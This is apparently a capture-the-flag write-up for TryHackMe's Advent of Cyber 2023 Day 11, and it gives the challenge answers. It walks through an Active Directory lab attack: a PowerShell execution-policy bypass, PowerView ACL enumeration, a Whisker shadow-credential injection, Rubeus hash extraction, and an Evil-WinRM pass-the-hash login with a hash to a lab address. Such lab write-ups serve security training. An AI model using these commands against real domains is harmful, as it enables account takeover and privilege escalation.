# Advent of Cyber 2023

Day 11 - Active Directory 

-----------------------------------------

- What is the hash of the vulnerable user?	
	- `03E805D8A8C5AA435FB48832DAD620E3`

- What is the content of flag.txt on the Administrator Desktop?
	- `THM`


<details>
Steps:

First we need to find  msDS-KeyCredentialLink if there any write privilege

```
cd C:\Users\hr\Desktop
powershell -ep bypass
. .\PowerView.ps1
```

cd C:\Users\hr\Desktop moves to the folder containing all the exploitation tools.
powershell -ep bypass will bypass the default policy for arbitrary PowerShell script execution.
. .\PowerView.ps1 loads the PowerView script into the memory.


At this point, we can enumerate the privileges by running:

```
Find-InterestingDomainAcl -ResolveGuids
```

As you may see, this command will return all users' privileges. Since we are specifically looking for the current user "hr", we need to filter out using:

```
Where-Object { $_.IdentityReferenceName -eq "hr" }  
```

We're interested in the current user, the vulnerable user, and the privilege assigned. We can filter that out by running:

```
Select-Object IdentityReferenceName, ObjectDN, ActiveDirectoryRights
```

Now you can run the command

```
Find-InterestingDomainAcl -ResolveGuids | Where-Object { $_.IdentityReferenceName -eq "hr" } | Select-Object IdentityReferenceName, ObjectDN, ActiveDirectoryRights
```

Then it returns this line

![image](https://github.com/kyou00/tryhackme-writeups/assets/92074685/e5570a2f-c282-46ed-8392-3227bbf9806d)

Then Using Whisker is straightforward: once we have a vulnerable user, we can run the add command from Whisker to simulate the enrollment of a malicious device, updating the msDS-KeyCredentialLink attribute

```
.\Whisker.exe add /target:vansprinkles
```

![image](https://github.com/kyou00/tryhackme-writeups/assets/92074685/48dae884-a197-4abd-b6a1-6786bdb4d178)


After that we can use Rebeus tool to impersonate the authentication.

![image](https://github.com/kyou00/tryhackme-writeups/assets/92074685/29fa4621-7544-42de-9650-508b769c5491)

![image](https://github.com/kyou00/tryhackme-writeups/assets/92074685/f68f9924-d22a-4082-b040-f3a9a9da7aa0)

You can now execute a pass-the-hash attack using the NTLM hash obtained from the previous command. This attack involves leveraging the encrypted password stored in the Domain Controller rather than relying on the plaintext password.

To do this, you can use Evil-WinRM, a tool for remotely managing Windows systems abusing the Windows Remote Management (WinRM) protocol.

```
ruby evil-winrm.rb -i 10.10.140.33 -u vansprinkles -H 03E805D8A8C5AA435FB48832DAD620E3
```

![image](https://github.com/kyou00/tryhackme-writeups/assets/92074685/472e845a-05a1-4483-9d12-e3ee61d5e563)

![image](https://github.com/kyou00/tryhackme-writeups/assets/92074685/dc5e4ec0-8847-49b9-9ad6-7b915832a0ff)

</details>
